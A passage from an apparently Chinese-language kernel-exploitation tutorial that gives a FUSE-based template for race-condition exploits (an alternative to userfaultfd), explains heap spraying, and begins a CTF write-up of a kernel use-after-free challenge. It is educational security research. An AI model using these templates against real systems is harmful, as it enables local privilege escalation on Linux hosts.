FUSE 版本</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUSE_USE_VERSION 29</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, <span class="hljs-type">fuse_fill_dir_t</span> filler, </span><br><span class="hljs-params">                          <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info* fi)</span><br>&#123;<br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        filler(buf, <span class="hljs-string">&quot;a3fuse_test_file&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_ops</span> =</span> &#123;<br>    .readdir = a3fuse_readdir,<br>    .getattr = a3fuse_getattr,<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fuse_main(argc, argv, &amp;a3fuse_ops, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>使用如下命令进行编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc a3fuse.c -o a3fuse -D_FILE_OFFSET_BITS=64 -lfuse</span><br></code></pre></td></tr></table></figure>

<p>效果如下图所示：</p>
<p><img src="https://s2.loli.net/2023/01/10/SWHjTioDVdtybIv.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>当然，由于我们的例程没有实现 <code>open()</code>、<code>read()</code>、<code>write()</code> 等函数，这里直接对文件进行访问会提示错误：</p>
<p><img src="https://s2.loli.net/2023/01/10/gZF7Dtz6YOEvCUy.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>FUSE 更深入的用法我们就暂且不深入学习了，我们这里主要关注如何在条件竞争中利用 FUSE</p>
<h3 id="利用-FUSE-替代-userfaultfd-进行条件竞争利用"><a href="#利用-FUSE-替代-userfaultfd-进行条件竞争利用" class="headerlink" title="利用 FUSE 替代 userfaultfd 进行条件竞争利用"></a>利用 FUSE 替代 userfaultfd 进行条件竞争利用</h3><p>让我们重新审视前面我们利用 userfaultfd 在条件竞争中利用的流程的本质：</p>
<ul>
<li>让进程在内核中进行数据拷贝时暂停，控制权转交我们的自定义函数，我们在自定义函数中将该内核对象重新分配到别处，在恢复数据拷贝时便能读写其他内核结构体的数据</li>
</ul>
<p>我们不难想到的是<strong>利用 FUSE 我们同样可以实现类似的效果</strong>：</p>
<ul>
<li>注册一个用户空间文件系统，为读写等接口注册回调函数，使用 mmap 将该文件系统中的一个文件映射到内存中</li>
<li>当进程在内核中读写这块 mmap 内存时，<strong>便会触发缺页异常，此时控制权便会转交到我们注册的回调函数当中</strong></li>
<li><strong>在回调函数当中完成我们的恶意操作</strong>（例如将进程正在读写的内核对象重新分配到别的位置，或是覆写该对象以改变一些特定属性）</li>
<li>重新回到内核中的读写流程，此时进程便会按照我们改变后的内核对象<strong>进行恶意操作</strong>（例如我们在 FUSE 的回调函数中将该对象重新分配到某个函数指针，恢复到内核的读写过程时进程便会覆写掉该函数指针）</li>
</ul>
<p>利用 FUSE，我们可以像 userfaultfd 那样<strong>利用条件竞争漏洞完成利用</strong>，不幸的是常规的 libfuse 库并不支持静态编译，这使得我们无法像以往一样先静态编译一个 exp 再传到远程，<strong>但万幸的是 libfuse 库是开源的</strong>，安全研究员 BitsByWill 和 D3v17 将其进行了一些裁剪（裁剪掉了 dlopen 等，但还是很大…），做了一个可以供静态编译的 <a target="_blank" rel="noopener" href="https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/libfuse3.a">libfuse3.a</a> 及相关的头文件等（参见<a target="_blank" rel="noopener" href="https://github.com/Crusaders-of-Rust/CVE-2022-0185">这里</a>）</p>
<p>以下是笔者编写的 FUSE 利用的模板，和示例程序相比，我们需要对一些接口进行微调：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUSE_USE_VERSION 34</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_NAME <span class="hljs-string">&quot;a3fuse_evil_file&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_DAEMON_NAME <span class="hljs-string">&quot;evil_fuse&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_MOUNT_PATH <span class="hljs-string">&quot;./evil&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_PATH EVIL_MOUNT_PATH <span class="hljs-string">&quot;/&quot;</span> EVIL_FILE_NAME</span><br><br><span class="hljs-type">char</span> *evil_args[] = &#123;EVIL_DAEMON_NAME, EVIL_MOUNT_PATH, <span class="hljs-literal">NULL</span>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_evil_ops</span> =</span> &#123;<br>    .readdir = a3fuse_evil_readdir,<br>    .getattr = a3fuse_evil_getattr,<br>    .read = a3fuse_evil_read,<br>    .write = a3fuse_evil_write,<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, EVIL_FILE_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(path + <span class="hljs-number">1</span>, EVIL_FILE_PATH)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">1</span>;<br>        stbuf-&gt;st_size = <span class="hljs-number">0x1000</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fill your buffer with needed data there</span><br><span class="hljs-comment">     * this&#x27;s an example, filling it simply with &#x27;A&#x27;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(evil_buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    <br>    <span class="hljs-built_in">memcpy</span>(buf, evil_buf + offset, size);<br>    <br>    <span class="hljs-comment">/* now you can do anything useful for exploit there */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(evil_buf + offset, buf, size);<br>    <br>    <span class="hljs-comment">/* now you can do anything useful for exploit there */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">fuse_exploit_sample</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *nearby_page, *evil_page;<br>    <span class="hljs-type">int</span> evil_file_fd;<br><br>    <span class="hljs-keyword">if</span> ((evil_file_fd = open(EVIL_FILE_PATH, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open evil file in FUSE!&quot;</span>);<br>    &#125;<br><br>    nearby_page = mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    evil_page = mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1338000</span>, <span class="hljs-number">0x1000</span>,  PROT_READ | PROT_WRITE, <br>                     MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (evil_page != (<span class="hljs-type">void</span>*)<span class="hljs-number">0x1338000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to map for FUSE file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/** </span><br><span class="hljs-comment">     * now try reading or writing through nearby_page and evil_page in kernel, </span><br><span class="hljs-comment">     * the a3fuse_evil_read/a3fuse_evil_write will be triggered automatically</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br>    <br>    munmap(nearby_page, <span class="hljs-number">0x1000</span>);<br>    munmap(evil_page, <span class="hljs-number">0x1000</span>);<br>    close(evil_file_fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">/* register for FUSE */</span><br>    fuse_main(<span class="hljs-keyword">sizeof</span>(evil_args) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>*) - <span class="hljs-number">1</span>, evil_args, <br>              &amp;a3fuse_evil_ops, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-comment">/* Your exploit here: */</span><br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>同时需要在编译选项中添加 <code>-I ./libfuse</code> ：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -no-pie -static exp.c -I ./libfuse libfuse3.a -o exp -masm=intel -pthread -D_FILE_OFFSET_BITS=64</span><br></code></pre></td></tr></table></figure>

<h3 id="FUSE-in-CTF"><a href="#FUSE-in-CTF" class="headerlink" title="FUSE in CTF"></a><em>FUSE in CTF</em></h3><p>虽然我们有了可以静态编译的 libfuse 库，但在 CTF 的 kernel pwn 这样”残缺“的环境当中我们通常是无法使用 FUSE 的，因而就无法使用这种利用手法：(</p>
<p><img src="https://s2.loli.net/2023/01/11/lMx5TnkEivWryFX.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://s2.loli.net/2023/01/15/e12LwEHGJmXjpx5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://s2.loli.net/2023/01/15/LcHPW1EVi7A6rwK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>不过可以在完备的真实环境中使用这种利用手法 : ）</p>
</blockquote>
<h1 id="0x06-Kernel-Heap-Heap-Spraying"><a href="#0x06-Kernel-Heap-Heap-Spraying" class="headerlink" title="0x06.Kernel Heap - Heap Spraying"></a>0x06.Kernel Heap - Heap Spraying</h1><p><strong>堆喷射</strong>（heap spraying）指的是一种辅助攻击手法：「<strong>通过大量分配相同的结构体来达成某种特定的内存布局</strong>，从而帮助攻击者完成后续的利用过程」，常见于如下场景：</p>
<ul>
<li>你有一个 UAF，但是<strong>你无法通过少量内存分配拿到该结构体</strong>（例如该 object 不属于当前 freelist 且释放后会回到 node 上，或是像 <code>add_key()</code> 那样会被一直卡在第一个临时结构体上），这时你可以<strong>通过堆喷射来确保拿到该 object</strong></li>
<li>你有一个堆溢出读&#x2F;写，但是<strong>堆布局对你而言是不可知的</strong>（比如说开启了 <code>SLAB_FREELIST_RANDOM</code>（默认开启）），你可以<strong>预先喷射大量特定结构体，从而保证对其中某个结构体的溢出</strong></li>
<li>……</li>
</ul>
<p>作为一种辅助的攻击手法，堆喷射可以被应用在多种场景下</p>
<h2 id="例题：RWCTF2023体验赛-Digging-into-kernel-3"><a href="#例题：RWCTF2023体验赛-Digging-into-kernel-3" class="headerlink" title="例题：RWCTF2023体验赛 - Digging into kernel 3"></a>例题：RWCTF2023体验赛 - Digging into kernel 3</h2><blockquote>
<p>和去年一样都是白给题，然后和去年一样摆烂半天拿三血 :-D</p>
<blockquote>
<p>不过本篇为了介绍堆喷射这一手法，同时为了使用更多不同的结构体，<strong>笔者会用比较复杂的思路去解题</strong></p>
</blockquote>
</blockquote>
<p><a href="/download/rwctf2023/Digging-into-Kernel-3.tar.gz" title="点击此处下载原题">题目下载 - Digging-into-Kernel-3.tar.gz</a></p>
<h3 id="①-题目分析-1"><a href="#①-题目分析-1" class="headerlink" title="① 题目分析"></a>① 题目分析</h3><p>按惯例查看启动脚本，发现开启了 SMEP、SMAP、KASLR、KPTI：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br>qemu-system-x86_64 \<br>	-m 128M \<br>	-nographic \<br>	-kernel ./bzImage \<br>	-initrd ./rootfs.img \<br>	-enable-kvm \<br>	-cpu kvm64,+smap,+smep \<br>	-monitor /dev/null \<br>	-append <span class="hljs-string">&#x27;console=ttyS0 kaslr kpti=1 quiet oops=panic panic=1 init=/init&#x27;</span> \<br>	-no-reboot \<br>	-snapshot \<br>	-s<br></code></pre></td></tr></table></figure>

<p>文件系统里给了一个 <code>rwctf.ko</code> ，拖入 IDA 进行分析，发现只定义了一个 ioctl，提供了两个功能：</p>
<ul>
<li>0xDEADBEEF：分配一个<strong>任意大小</strong>的 object 并能写入数据，分配 flag 为 <code>__GFP_ZERO | GFP_KERNEL</code>，不过我们只能同时有两个 object</li>
<li>0xC0DECAFE：释放一个之前分配的 object ，<strong>存在 UAF</strong></li>
</ul>
<p><img src="https://s2.loli.net/2023/02/07/LRZC2kTujnWsIoX.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>我们需要传入如下结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> idx;<br>    <span class="hljs-type">uint32_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>经过笔者测试，出题人<strong>手动关闭了如下默认开启的保护</strong>（出题人为了降低题目难度，可能关的更多，笔者只测了这几个）：</p>
<ul>
<li>关闭了 <code>CONFIG_MEMCG_KMEM</code>，这使得<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 会从同样的 <code>kmalloc-xx</code> 中进行分配</li>
<li>关闭了 <code>CONFIG_RANDOMIZE_KSTACK_OFFSET</code>，这使得固定函数调用到内核栈底的偏移值是不变的</li>
<li>关闭了 <code>SLAB_FREELIST_HARDENED</code>，这使得 freelist 几乎没有任何保护，我们可以轻易完成任意地址分配 + 任意地址读写</li>
</ul>
<blockquote>
<p><del>但是现在都 3202 年了，出这种和去年几乎一样的入门级白给题有意思🐎</del>（←说这句话的人已经被乱拳打死了</p>
</blockquote>
<h3 id="②-漏洞利用-1"><a href="#②-漏洞利用-1" class="headerlink" title="② 漏洞利用"></a>② 漏洞利用</h3><p>既然题目中已经直接白给出了一个无限制的 UAF，那么利用方式就是多种多样的了 :-D </p>
<h4 id="Step-I-堆喷-user-key-payload-越界读泄露内核基地址"><a href="#Step-I-堆喷-user-key-payload-越界读泄露内核基地址" class="headerlink" title="Step.I - 堆喷 user_key_payload 越界读泄露内核基地址"></a>Step.I - 堆喷 user_key_payload 越界读泄露内核基地址</h4><p>首先我们需要先泄露内核基址，这里笔者选择使用 <a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">user_key_payload</a> 来完成利用：）</p>
<p>在内核当中存在一个用于密钥管理的子系统，内核提供了 <code>add_key()</code> 系统调用进行密钥的创建，并提供了 <code>keyctl()</code> 系统调用进行密钥的读取、更新、销毁等功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br>        <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;keyutils.h&gt;</span></span><br><br>        <span class="hljs-type">key_serial_t</span> <span class="hljs-title function_">add_key</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *type, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *description,</span><br><span class="hljs-params">                                    <span class="hljs-type">const</span> <span class="hljs-type">void</span> *payload, <span class="hljs-type">size_t</span> 